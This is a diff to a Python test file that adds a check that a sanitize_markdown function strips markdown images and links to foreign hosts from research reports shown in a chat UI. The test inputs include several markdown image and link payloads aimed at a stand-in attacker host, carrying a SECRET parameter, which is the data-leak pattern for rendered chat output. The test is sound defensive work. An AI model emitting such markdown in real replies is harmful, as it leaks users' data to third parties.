@@ -1,4 +1,10 @@
-from bebbi_deep_research.services.report import build_sources, owui_source_events, split_report, ui_markdown
+from bebbi_deep_research.services.report import (
+    build_sources,
+    owui_source_events,
+    sanitize_markdown,
+    split_report,
+    ui_markdown,
+)
 
 FOCUS = """# Stadtklima
 
@@ -141,3 +147,27 @@ def test_source_titles_are_sanitised():
         and "\x1b" not in s["title"]
         and s["title"].startswith("Titel")
     )
+
+
+def test_nested_or_escaped_brackets_do_not_render_as_image_or_foreign_link():
+    """Review D2: `![a[b]c](url)` passed the regexes and rendered as an image that loads when the chat opens."""
+    import markdown_it
+
+    def tokens(toks):
+        for t in toks:
+            yield t
+            yield from tokens(t.children or [])
+
+    ok = "https://grosserrat.bs.ch/geschaefte/23.5001"
+    for text in (
+        "![a[b]c](https://evil.example/x?d=SECRET)",
+        r"![a\]b](https://evil.example/x?d=SECRET)",
+        "[a[b]c](https://evil.example/p)",
+        r"\\![x](https://evil.example/y)",
+        f"[a[b]c]({ok}.evil.example)",
+    ):
+        out = sanitize_markdown(text, {ok})
+        for t in tokens(markdown_it.MarkdownIt("commonmark").parse(out)):
+            assert t.type != "image", (text, out)
+            assert t.type != "link_open" or t.attrs.get("href") == ok, (text, out)
+    assert sanitize_markdown(f"Siehe [1] und [Quelle]({ok}).", {ok}) == f"Siehe [1] und [Quelle]({ok})."
